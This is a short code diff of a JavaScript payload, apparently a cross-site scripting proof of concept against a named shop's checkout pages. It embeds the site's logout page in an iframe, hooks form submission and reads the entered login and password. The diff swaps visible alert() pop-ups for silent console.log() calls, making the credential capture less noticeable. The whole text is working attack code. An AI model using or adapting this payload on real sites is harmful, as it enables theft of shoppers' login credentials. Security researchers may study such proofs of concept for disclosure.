@@ -1,4 +1,4 @@
-alert(document.domain);
+console.log(document.domain);
 var a=document.createElement("iframe");
 a.src="https://www.bitiba.de/checkout/logout.htm";
 a.name="mainsite";
@@ -9,7 +9,7 @@ document.body.appendChild(a);
 function formHandler(e){
   console.log(e);
   if(e?.srcElement.length>0){
-    alert("The credentials are been spied on: \n" 
+    console.log("The credentials are been spied on: \n" 
     + "Login is : "+ e.srcElement[1].value +"\n"
     + "Password is : "+ e.srcElement[2].value +"\n"
     );
